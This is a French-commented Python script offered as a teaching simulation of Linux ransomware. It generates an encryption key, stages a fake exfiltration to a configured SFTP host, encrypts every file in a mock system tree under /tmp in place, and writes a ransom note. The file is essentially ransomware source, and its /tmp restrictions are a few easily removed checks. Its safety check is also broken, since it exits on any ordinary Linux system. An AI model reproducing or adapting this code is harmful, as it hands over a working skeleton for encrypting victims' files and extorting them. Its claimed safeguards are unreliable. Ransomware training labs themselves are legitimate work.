#!/usr/bin/env python3
# ransomware_total_system.py - Simulation pédagogique avancée de ransomware Linux

import os
import sys
import logging
from cryptography.fernet import Fernet
import paramiko
import socket
import subprocess
from datetime import datetime

# Configuration
LOG_FILE = "/tmp/ransomware_system_sim.log"
SFTP_SERVER = "192.168.239.130"  # LAISSER VIDE pour la simulation
SFTP_USER = "test"
SFTP_PASS = "test"
SFTP_PORT = 22
SFTP_REMOTE_PATH = "/tmp/exfil_keys"
RANSOM_NOTE = "/tmp/README_SYSTEM_SIMULATION.txt"

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Liste des répertoires système à cibler (en simulation)
SYSTEM_DIRS = [
    "/tmp/system_sim/bin",
    "/tmp/system_sim/etc",
    "/tmp/system_sim/lib",
    "/tmp/system_sim/usr",
    "/tmp/system_sim/var"
]


def setup_simulation_environment():
    """Crée une arborescence système simulée pour les tests"""
    try:
        # Crée une structure de répertoires simulée
        for dir_path in SYSTEM_DIRS:
            os.makedirs(dir_path, exist_ok=True)

            # Crée des fichiers tests dans chaque répertoire
            for i in range(3):
                with open(f"{dir_path}/system_file_{i}.dat", 'wb') as f:
                    f.write(os.urandom(1024))  # Fichiers de 1KB avec données aléatoires

        logging.info("Environnement de test système créé avec succès")
    except Exception as e:
        logging.error(f"Erreur création environnement test: {str(e)}")
        sys.exit(1)


def safety_checks():
    """Vérifications de sécurité renforcées"""
    # Empêche l'exécution sur de vrais systèmes
    real_system_paths = ['/home', '/etc', '/bin', '/usr', '/var', '/lib']
    for path in real_system_paths:
        if os.path.exists(path) and not path.startswith('/tmp/'):
            logging.critical(f"Tentative d'exécution sur un vrai système! Chemin détecté: {path}")
            sys.exit(1)

    # Demande de confirmation explicite
    print("""
    ⚠️ ATTENTION - SIMULATION SYSTÈME UNIQUEMENT ⚠️

    Ce script est une simulation pédagogique avancée de ransomware système.
    Il NE DOIT PAS être exécuté sur un système réel et ne fonctionne que dans /tmp.

    Tous les fichiers manipulés sont des copies simulées dans /tmp.

    Appuyez sur Ctrl+C pour annuler maintenant.
    """)
    confirmation = input("Pour continuer la simulation système, tapez 'SYSTEM-SIMULATION': ")
    if confirmation != "SYSTEM-SIMULATION":
        sys.exit(0)


def check_root():
    """Vérifie que le script est exécuté en root"""
    if os.geteuid() != 0:
        logging.error("Le script doit être exécuté en tant que root!")
        sys.exit(1)


def generate_key():
    """Génère une clé de chiffrement Fernet"""
    try:
        key = Fernet.generate_key()
        logging.info(f"Clé générée: {key.decode()}")
        return key
    except Exception as e:
        logging.error(f"Erreur génération clé: {str(e)}")
        sys.exit(1)


def exfiltrate_key(key):
    """Simule l'exfiltration de clé"""
    try:
        hostname = socket.gethostname()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        remote_filename = f"{hostname}_system_{timestamp}.key"

        # Simulation d'exfiltration
        os.makedirs("/tmp/simulated_exfil", exist_ok=True)
        with open(f"/tmp/simulated_exfil/{remote_filename}", 'wb') as f:
            f.write(key)

        logging.info(f"SIMULATION: Clé système aurait été exfiltrée vers {SFTP_SERVER}/{remote_filename}")
    except Exception as e:
        logging.error(f"Erreur simulation exfiltration: {str(e)}")


def encrypt_file(filepath, fernet):
    """Chiffre un fichier en place - version système simulée"""
    try:
        # Vérification supplémentaire pour ne toucher que /tmp
        if not filepath.startswith('/tmp/'):
            logging.warning(f"Tentative de chiffrement hors zone test: {filepath}")
            return

        # Taille max pour la simulation
        if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB
            logging.warning(f"Fichier système simulé trop volumineux, ignoré: {filepath}")
            return

        with open(filepath, 'rb') as f:
            data = f.read()

        encrypted_data = fernet.encrypt(data)

        with open(filepath, 'wb') as f:
            f.write(encrypted_data)

        logging.info(f"Fichier système simulé chiffré: {filepath}")
    except Exception as e:
        logging.warning(f"Échec chiffrement test {filepath}: {str(e)}")


def should_encrypt(path):
    """Détermine si un fichier doit être chiffré - version système"""
    # Exclusion des fichiers de log et du script lui-même
    exclusions = [
        LOG_FILE, RANSOM_NOTE, __file__
    ]

    path_str = str(path)
    return all(excl not in path_str for excl in exclusions)


def encrypt_system(fernet):
    """Parcourt et chiffre le système de fichiers simulé"""
    logging.info("Début simulation chiffrement système...")

    # Parcourt tous les répertoires système simulés
    for system_dir in SYSTEM_DIRS:
        for root, dirs, files in os.walk(system_dir):
            for file in files:
                filepath = os.path.join(root, file)
                if should_encrypt(filepath):
                    try:
                        encrypt_file(filepath, fernet)
                    except Exception as e:
                        logging.warning(f"Erreur traitement fichier système {filepath}: {str(e)}")


def create_ransom_note(key):
    """Crée une note de simulation système"""
    note = f"""
    ⚠️ SIMULATION SYSTÈME PÉDAGOGIQUE - PAS DE RANÇON RÉELLE ⚠️

    Ceci est une simulation avancée de ransomware système pour formation.
    Une arborescence système simulée dans /tmp a été chiffrée.

    Clé de simulation système: {key[:8]}...

    Fichiers affectés:
    - /tmp/system_sim/bin/*
    - /tmp/system_sim/etc/*
    - /tmp/system_sim/lib/*
    - /tmp/system_sim/usr/*
    - /tmp/system_sim/var/*
    """

    try:
        with open(RANSOM_NOTE, 'w') as f:
            f.write(note)
        logging.info("Note de simulation système créée")
    except Exception as e:
        logging.error(f"Erreur création note système: {str(e)}")


def simulate_recovery_disable():
    """Simule la désactivation des mécanismes de récupération système"""
    logging.info("SIMULATION: Désactivation mécanismes de récupération système")
    # Ne fait rien de réel


def simulate_reboot():
    """Simule un redémarrage système"""
    logging.info("SIMULATION: Redémarrage système simulé")
    # Ne fait rien de réel


def main():
    # Vérifications de sécurité
    safety_checks()
    check_root()

    # Configuration environnement de test
    setup_simulation_environment()

    logging.info("=== DÉBUT SIMULATION RANSOMWARE SYSTÈME ===")

    # Étape 1: Génération clé
    key = generate_key()
    fernet = Fernet(key)

    # Étape 2: Simulation exfiltration
    exfiltrate_key(key)

    # Étape 3: Chiffrement système simulé
    encrypt_system(fernet)

    # Étape 4: Simulation désactivation récupération
    simulate_recovery_disable()

    # Étape 5: Note de simulation système
    create_ransom_note(key.decode())

    # Étape 6: Simulation redémarrage
    simulate_reboot()

    logging.info("=== FIN SIMULATION SYSTÈME ===")
    print("Simulation système terminée. Aucun fichier réel n'a été modifié.")
    print(f"Logs disponibles dans {LOG_FILE}")


if __name__ == "__main__":
    main()